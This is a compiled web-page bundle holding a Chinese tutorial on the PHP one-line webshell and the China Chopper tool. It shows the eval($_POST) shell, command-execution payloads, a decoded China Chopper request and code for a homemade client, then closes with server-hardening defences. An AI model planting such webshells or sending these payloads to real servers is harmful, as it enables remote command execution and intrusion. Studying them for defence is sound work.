import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o,c,a,b as s,d as e,f as i}from"./app-8d2c7d6f.js";const l="/assets/1-986bf64b.png",r="/assets/2-49d4435d.png",u="/assets/3-117b43c6.png",d="/assets/4-5942b99a.png",k="/assets/5-ab535ea9.png",m="/assets/6-9ee3d90d.png",b="/assets/7-6524e8ca.png",g="/assets/8-daf311d8.png",h="/assets/9-4f9a0c49.png",v="/assets/10-07cb7f14.png",f="/assets/11-3c781f97.png",_="/assets/12-63008535.png",y="/assets/13-bc1d81f0.png",P="/assets/14-0a7ec025.png",z="/assets/15-974fbcc8.png",I={},q=i('<h2 id="引言" tabindex="-1"><a class="header-anchor" href="#引言" aria-hidden="true">#</a> 引言</h2><p>未知攻，焉知防。本文仅用来研究及学习PHP一句话木马及中国菜刀软件的原理及防御。</p><hr><h2 id="什么是php一句话木马" tabindex="-1"><a class="header-anchor" href="#什么是php一句话木马" aria-hidden="true">#</a> 什么是PHP一句话木马</h2><p>还是以栗子说明：</p><figure><img src="'+l+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>上图是一个最简单的PHP一句话木马。简单的解释一下： <code>@</code>不在前端网页显示报错信息 <code>eval()</code>函数 — 把字符串作为PHP代码执行. <code>$_POST[&#39;abcd&#39;]</code> 创建一个名为abcd的变量，通过_POST请求传入数据 这么简单的一句话可以产生什么效果呢？</p><p>举另一个栗子，来看一下： 1.搭建一个php网站环境，为了方便我用的PHPStudy，然后创建一个新的PHP文件，将上图代码写入并保存。</p><figure><img src="'+r+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>2.访问一下，好像并没有什么异常</p><p>3.然后以非正常姿势访问一下。发送一个POST请求，我使用的是Firefox浏览的hackbar插件（强烈推荐非常好用），hackbar可以在Firefox 插件商店下载，当然也可以用Burp发包不过我感觉比较麻烦。 使用Firefox访问测试页面，按F12键，选择HackBar</p><figure><img src="'+u+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>4.点击Load URL，载入当前访问的地址</p><figure><img src="'+d+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>5.勾选Post data，输入abcd=phpinfo();,点击Execute执行一下。</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>abcd<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+k+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>6.phpinfo()函数已经执行，并在前端显示出来了。好像并没有什么猪皮用？，来试试输入一下下面的代码并执行</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>abcd<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span>calc<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+m+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>7.？？？计算器怎么弹出来了？在搞些蛇皮？解释一下： <code>system()</code> 函数-执行系统命令 <code>calc</code> CMD命令打开计算器 当把这个POST传到服务器时，相当于在服务器上执行了下面这段代码：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;system(calc);&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面解释过eval()函数的作用：将字符串当作PHP代码执行。也就是说，利用这两个函数我们就可以在服务器上为所欲为之为所欲为了（又加快了入狱速度，很开心？）。</p><hr><h2 id="什么是中国菜刀" tabindex="-1"><a class="header-anchor" href="#什么是中国菜刀" aria-hidden="true">#</a> 什么是中国菜刀</h2><h2 id="中国菜刀是一款专业的-网站管理-软件-用途广泛-使用方便-小巧实用。只要支持动态脚本的网站-都可以用中国菜刀来进行-管理-在非简体中文环境下使用-自动切换到英文界面。uincode方式编译-支持多国语言输入显示。-某百科说的-不是我说的-支持的服务端脚本-php-asp-net。可以理解为一个封装好的eval-函数加system-的post请求利用工具-常常被一些黑客用作非法用途。" tabindex="-1"><a class="header-anchor" href="#中国菜刀是一款专业的-网站管理-软件-用途广泛-使用方便-小巧实用。只要支持动态脚本的网站-都可以用中国菜刀来进行-管理-在非简体中文环境下使用-自动切换到英文界面。uincode方式编译-支持多国语言输入显示。-某百科说的-不是我说的-支持的服务端脚本-php-asp-net。可以理解为一个封装好的eval-函数加system-的post请求利用工具-常常被一些黑客用作非法用途。" aria-hidden="true">#</a> 中国菜刀是一款专业的“网站管理”软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行“管理”！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示。----某百科说的，不是我说的！ 支持的服务端脚本：PHP, ASP，.NET。 可以理解为一个封装好的eval()函数加system()的POST请求利用工具，常常被一些黑客用作非法用途。</h2><h2 id="分析中国菜刀的post请求信息" tabindex="-1"><a class="header-anchor" href="#分析中国菜刀的post请求信息" aria-hidden="true">#</a> 分析中国菜刀的POST请求信息</h2><p>1.首先，打开Wireshark监听一下网卡。</p><figure><img src="`+b+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>2.用菜刀给靶机弹个计算器</p><figure><img src="'+g+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>3.找到刚才菜刀发出去的包</p><figure><img src="'+h+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>4.把数据粘贴出来看一下，好像看到了eval?</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>abcd=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jz
IiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNl
NjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWR
VJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwf
SB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC
0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=Y2QgL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1wiJmNhbGMmZWNobyBb
U10mY2QmZWNobyBbRV0%3D
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>5.Wireshark复制出来的是还没经过URL解码的，解码看一下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>abcd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1p
dCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk\\
7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdK
TskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4m
MSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=&amp;z1=Y21k&amp;z2=Y2Q
gL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1wiJmNhbGMmZWNobyBbU10mY2QmZWNobyBbRV0=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>6.好像看到了z0、z1、z2三个变量？整理一下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>abcd=@eval(base64_decode($_POST[z0]));
&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50a
W1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbIn
oyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyB
cInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIK
cmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=
&amp;z1=Y21k
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>7.看起来z0、z1、z2三个变量的值经过Base64编码了，解一下码看看：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>abcd<span class="token operator">=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>z0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>z0<span class="token operator">=</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;display_errors&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_magic_quotes_runtime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;-
&gt;|&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;z1&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;z2&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;SCRIPT_FILENAME&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$
c<span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string double-quoted-string">&quot;/&quot;</span><span class="token operator">?</span><span class="token string double-quoted-string">&quot;-c \\&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$s</span><span class="token punctuation">}</span></span>\\&quot;&quot;</span><span class="token punctuation">:</span><span class="token string double-quoted-string">&quot;/c \\&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$s</span><span class="token punctuation">}</span></span>\\&quot;&quot;</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token punctuation">}</span></span> <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$c</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot; 2&gt;&amp;1&quot;</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">&quot;
ret=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$ret</span><span class="token punctuation">}</span></span>
&quot;</span><span class="token punctuation">:</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;|&lt;-&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>z1<span class="token operator">=</span>cmd
<span class="token operator">&amp;</span>z2<span class="token operator">=</span>cd <span class="token operator">/</span>d &quot;<span class="token constant">C</span><span class="token punctuation">:</span>\\phpStudy\\PHPTutorial\\<span class="token constant">WWW</span>\\&quot;<span class="token operator">&amp;</span>calc<span class="token operator">&amp;</span><span class="token keyword">echo</span> <span class="token punctuation">[</span><span class="token constant">S</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>cd<span class="token operator">&amp;</span><span class="token keyword">echo</span> <span class="token punctuation">[</span><span class="token constant">E</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>8.整理一下，把图片保存下来看更清晰：</p><p><img src="`+v+`" alt="" loading="lazy"> &amp;z2经过上面的判断处理后成为:</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>/c <span class="token operator">&amp;</span><span class="token builtin class-name">cd</span> /d &quot;C:<span class="token punctuation">\\</span>phpStudy<span class="token punctuation">\\</span>PHPTutorial<span class="token punctuation">\\</span>WWW<span class="token punctuation">\\</span>&quot;<span class="token operator">&amp;</span>calc<span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin class-name">cd</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>E<span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>&amp;z1和&amp;z2拼接起来后是一条完整的CMD命令:</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>cmd /c <span class="token operator">&amp;</span><span class="token builtin class-name">cd</span> /d &quot;C:<span class="token punctuation">\\</span>phpStudy<span class="token punctuation">\\</span>PHPTutorial<span class="token punctuation">\\</span>WWW<span class="token punctuation">\\</span>&quot;<span class="token operator">&amp;</span>calc<span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin class-name">cd</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>E<span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>/c 参数，执行完命令后关闭命令窗口 &amp; 在一条语句中执行多个命令 /d 直接进入指定目录 cd 不带参数和选项，输出当前物理路径 这句命令解释为：打开cmd，执行cd入后面的目录，calc弹出计算器，echo出标之符[s]，打印出当前目录，echo出标志符[E]</p><p>为什么要echo出标识符[S][E]，有什么用呢？ 很多情况下一句话木马是嵌入到某些页面中的，也就是页面输出内容除了命令执行结果还有网页中的其他内容，这就需要在Request爬取页面后用正则匹配或其他方式找到我们想要的命令执行结果。这里的[S][E]只是要匹配出&amp;cd命令的执行结果，前面还有echo(&quot;|&gt;-&quot;)echo(&quot;|&lt;-&quot;),是为了匹配出我们想要的所有结果。</p><p>两个标识符[S][E]中间为什么要打印出当前目录？ 这就要从程序实现上解释了，当我们不考虑路径时，我们可以使用system()执行任何想要的命令。但由于PHP的特性，在页面执行完毕后对应的程序生命周期也就结束了，变量会被重置，举个栗子：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当我们第一次打开页面时，代码从上到下执行，页面输出2，该页面的程序生命周期结束。当我们刷新页面时，程序重新进入生命周期，依然是从上到下执行，输出2。 当我们执行<code>cd ..</code>这种更改路径的命令时，网页执行命令，进入上级路径C:\\phpStudy\\PHPTutorial。<code>cd ..</code>是根据相对路径执行的，也就是相对于网页文件的目录。但是，当我们下次再执行cd ..命令时，由于PHP的特性，依然是从网页文件所在目录执行 <code>cd ..</code> 。 所以我们要保存下来cd ..的执行结果，也就是&amp;cd打印出来然后保存下来，然后配合命令前半部分的 <code>cmd /c &amp;amp;cd /d &quot;C:\\phpStudy\\PHPTutorial\\WWW\\&quot; </code>,把其中的路径当作一个参数，下次执行时只需要将打印保存下来的路径作为参数填到命令中，就像这样<code>cmd /c &amp;amp;cd /d &quot;C:\\phpStudy\\PHPTutorial\\&quot; </code>完解决了路径问题。 （菜刀作者写的PHP代码和Shell是真的骚）。</p><hr><h1 id="实现简单的菜刀" tabindex="-1"><a class="header-anchor" href="#实现简单的菜刀" aria-hidden="true">#</a> 实现简单的菜刀</h1><p>中国菜刀的工作原理大致可分为三个步骤：</p><ol><li>构造POST请求</li><li>发送POST请求并爬取页面信息</li><li>处理信息（包括获取命令执行结果，以及更新路径）</li></ol><p>首先看一下构造POST请求的轮子长什么样，先上代码： 和python中的Requests包类似，也是用字典构造请求参数。</p><figure><img src="`+f+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后看一下发送POST请求并爬取页面的轮子：</p><figure><img src="'+_+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>最后处理信息就需要自己发明轮子了： 我的PHP代码只有一句话很简单（骚不过，骚不过）</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword type-declaration">string</span> phpCode <span class="token operator">=</span> <span class="token keyword type-declaration">string</span><span class="token operator">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;echo &#39; [h2o]&#39;; @eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span>z0<span class="token punctuation">]</span></span>); &amp;z0=<span class="token interpolation"><span class="token variable">$r</span></span>=base64_decode(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span>z1<span class="token punctuation">]</span></span>); @system(<span class="token interpolation"><span class="token variable">$r</span></span>,<span class="token interpolation"><span class="token variable">$ret</span></span>); 
if(<span class="token interpolation"><span class="token variable">$ret</span></span>!=0) echo <span class="token interpolation"><span class="token variable">$ret</span></span>;echo &#39;[h2o] &#39;; &amp;z1={0}&quot;</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//php代码</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>因为初始化的时候需要先获取路径，获取路径只需要执行php的<code>getcwd()</code>方法即可，所以我发明了两个轮子，一个执行PHP代码的轮子，一个执行CMD命令的轮子。为什么要这么做呢？因为这样不论我执行PHP代码还是CMD命令，只需要调用相应的方法传入参数就可以了。</p><p><img src="`+y+'" alt="" loading="lazy"><img src="'+P+`" alt="" loading="lazy"></p><h1 id="正文-如何防范php一句话木马" tabindex="-1"><a class="header-anchor" href="#正文-如何防范php一句话木马" aria-hidden="true">#</a> 正文，如何防范PHP一句话木马</h1><p>方法一：Windows下，Apache默认是System权限运行，哇贼恐怖！我们来给Apache降降权吧。执行下面的命令。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>net user apache fuckmicrosoft /add <span class="token comment">#新建一个用户，用户名apache,密码fuckmicrosoft</span>
net localgroup <span class="token function">users</span> apache /del <span class="token comment">#把apache用户从users用户组中删除，这样apache就不属于任何用户组了</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后设置apache服务的账户:</p><figure><img src="`+z+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>方法二：禁用system、exec等可以执行webshell的方法。 1.打开php.ini 2.设置<code>disable_functions= passthru，exec，shell_exec，system</code></p><p>方法三：修改httpd.conf，只允许php脚本程序在web目录里操作： <code>php_admin_value open_basedir web物理路径</code></p><p>方法四：待补充~</p><hr><h2 id="参考资料" tabindex="-1"><a class="header-anchor" href="#参考资料" aria-hidden="true">#</a> 参考资料</h2>',73),R={href:"http://www.php.net/docs.php",target:"_blank",rel:"noopener noreferrer"},x={href:"https://www.cnblogs.com/accumulater/p/7110811.html",target:"_blank",rel:"noopener noreferrer"},T={href:"http://houliang4285.iteye.com/blog/1687816",target:"_blank",rel:"noopener noreferrer"},S={href:"https://blog.csdn.net/gscaiyucheng/article/details/24911375",target:"_blank",rel:"noopener noreferrer"},C={href:"http://www.ifuryst.com/archives/caidao.html",target:"_blank",rel:"noopener noreferrer"},w={href:"https://gitee.com/week233/Cknife",target:"_blank",rel:"noopener noreferrer"},V={href:"https://gitee.com/week233/ARPAttack",target:"_blank",rel:"noopener noreferrer"};function W(J,X){const n=t("ExternalLinkIcon");return o(),c("div",null,[q,a("p",null,[a("a",R,[s("PHP官方API"),e(n)]),a("a",x,[s("Windows CMD命令大全"),e(n)]),a("a",T,[s("CMD /C 和CMD /k命令"),e(n)]),a("a",S,[s("技术剖析中国菜刀原理"),e(n)]),a("a",C,[s("中国菜刀原理浅分析"),e(n)]),a("a",w,[s("CKnife源码"),e(n)]),a("a",V,[s("牢底坐穿工具箱"),e(n)])])])}const O=p(I,[["render",W],["__file","index.html.vue"]]);export{O as default};
